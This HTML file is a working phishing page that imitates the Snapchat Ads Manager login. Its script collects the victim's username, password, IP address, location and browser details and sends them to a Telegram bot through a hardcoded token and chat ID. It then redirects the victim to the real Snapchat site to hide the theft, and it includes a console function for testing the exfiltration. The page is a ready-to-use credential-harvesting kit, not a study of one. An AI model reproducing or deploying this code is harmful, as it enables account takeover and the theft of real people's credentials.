<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Ads Manager • Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }

        .login-card {
            background-color: #ffffff;
            border-radius: 20px;
            padding: 32px 24px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 4px;
            line-height: 1.2;
        }

        .subtitle {
            font-size: 16px;
            color: #6b6b6b;
            margin-bottom: 28px;
            font-weight: 400;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        .input-group {
            margin-bottom: 18px;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 6px;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            background-color: #fafafa;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            transition: all 0.2s;
        }

        .input-field:focus {
            border-color: #fffc00;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.15);
        }

        .forgot-link {
            text-align: right;
            margin: 5px 0 25px 0;
        }

        .forgot-link a {
            color: #1a1a1a;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }

        .forgot-link a:hover {
            text-decoration: underline;
        }

        .login-btn {
            background-color: #fffc00;
            color: #000000;
            border: none;
            border-radius: 30px;
            padding: 15px 20px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            width: 100%;
            margin-bottom: 20px;
            border: 1px solid rgba(0, 0, 0, 0.05);
        }

        .login-btn:hover {
            background-color: #f2ee00;
            transform: scale(1.01);
        }

        .login-btn:disabled {
            background-color: #f0f0f0;
            color: #999;
            cursor: not-allowed;
            transform: none;
        }

        .snapchat-brand {
            text-align: center;
            margin: 15px 0 20px 0;
            font-size: 24px;
            font-weight: 700;
            color: #000;
            letter-spacing: -0.3px;
        }

        .snapchat-brand span {
            color: #fffc00;
            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }

        .signup-section {
            text-align: center;
            border-top: 1px solid #eaeaea;
            padding-top: 24px;
        }

        .signup-text {
            font-size: 15px;
            color: #5e5e5e;
        }

        .signup-text a {
            color: #000000;
            font-weight: 700;
            text-decoration: none;
            margin-left: 4px;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            font-size: 12px;
            color: #8a8a8a;
            margin-top: 25px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #6b6b6b;
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
        }

        .footer-links a:hover {
            color: #000;
        }

        .copyright {
            color: #8a8a8a;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <h1>Log In</h1>
            <div class="subtitle">to continue to Ads Manager</div>

            <form id="loginForm">
                <div class="input-group">
                    <label for="username">Username or Email</label>
                    <input type="text" class="input-field" id="username" placeholder="Username or Email" required autocomplete="off">
                </div>

                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" class="input-field" id="password" placeholder="Password" required autocomplete="off">
                </div>

                <div class="forgot-link">
                    <a href="#">Forgot Password</a>
                </div>

                <button type="submit" class="login-btn" id="loginBtn">Log In</button>

                <div class="snapchat-brand">
                    Snapchat
                </div>

                <div class="signup-section">
                    <div class="signup-text">
                        New To Snapchat? <a href="#">Sign Up</a>
                    </div>
                </div>
            </form>
        </div>

        <div class="footer">
            <div class="footer-links">
                <a href="#">About</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Contact</a>
                <a href="#">Support</a>
            </div>
            <div class="copyright">
                © 2024 Snapchat · All rights reserved
            </div>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration - Your Details
        const BOT_TOKEN = '8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig';
        const CHAT_ID = '6398977115';

        // Function to get user IP
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unable to fetch';
            }
        }

        // Function to get location from IP
        async function getLocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return `${data.city || ''}, ${data.country_name || ''}`.replace(', ', '') || 'Unknown';
            } catch (error) {
                return 'Unknown';
            }
        }

        // Function to send data to Telegram
        async function sendToTelegram(username, password) {
            try {
                // Get IP
                const userIP = await getUserIP();
                
                // Get location
                const location = await getLocation(userIP);
                
                // Get browser info
                const browserInfo = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenSize = `${window.screen.width}x${window.screen.height}`;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                
                // Current time
                const now = new Date();
                const timeStr = now.toLocaleString('en-US', { 
                    year: 'numeric', 
                    month: '2-digit', 
                    day: '2-digit', 
                    hour: '2-digit', 
                    minute: '2-digit', 
                    second: '2-digit',
                    hour12: true 
                });

                // Create message - Clean format
                const message = 
`🔐 *SNAPCHAT LOGIN ALERT*
━━━━━━━━━━━━━━━━
👤 *Username/Email:* \`${username}\`
🔑 *Password:* \`${password}\`
━━━━━━━━━━━━━━━━
🌍 *IP Address:* \`${userIP}\`
📍 *Location:* \`${location}\`
━━━━━━━━━━━━━━━━
💻 *Browser:* ${browserInfo.substring(0, 80)}...
📱 *Platform:* \`${platform}\`
🌐 *Language:* \`${language}\`
🖥️ *Screen:* \`${screenSize}\`
⏰ *Time:* \`${timeStr}\`
━━━━━━━━━━━━━━━━`;

                // Send to Telegram
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const result = await response.json();
                
                if (result.ok) {
                    console.log('✅ Login details sent to Telegram successfully');
                    return true;
                } else {
                    console.log('❌ Telegram error:', result);
                    return false;
                }
            } catch (error) {
                console.log('❌ Error:', error);
                return false;
            }
        }

        // Form submission handler
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                return;
            }

            // Disable button
            const loginBtn = document.getElementById('loginBtn');
            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging in...';

            try {
                // Send to Telegram and wait for it to complete
                const sent = await sendToTelegram(username, password);
                
                if (sent) {
                    console.log('✅ Data sent successfully');
                } else {
                    console.log('⚠️ Data may not have sent');
                }
            } catch (error) {
                console.log('❌ Error in form submission:', error);
            }

            // Redirect to real Snapchat
            setTimeout(() => {
                window.location.href = 'https://accounts.snapchat.com/accounts/v2/login';
            }, 1000);
        });

        // Input field effects
        document.querySelectorAll('.input-field').forEach(field => {
            field.addEventListener('focus', function() {
                this.style.borderColor = '#fffc00';
                this.style.backgroundColor = '#ffffff';
            });
            
            field.addEventListener('blur', function() {
                this.style.borderColor = '#e0e0e0';
                this.style.backgroundColor = '#fafafa';
            });
        });

        // Test function - Call this from console to test Telegram
        window.testTelegram = async function() {
            console.log('🔍 Testing Telegram connection...');
            const result = await sendToTelegram('test_user', 'test_password_123');
            if (result) {
                console.log('✅ Test successful! Check your Telegram bot.');
                alert('✅ Telegram is working! Check your bot.');
            } else {
                console.log('❌ Test failed! Check console for errors.');
                alert('❌ Telegram test failed. Check console.');
            }
        };
    </script>
</body>
</html>
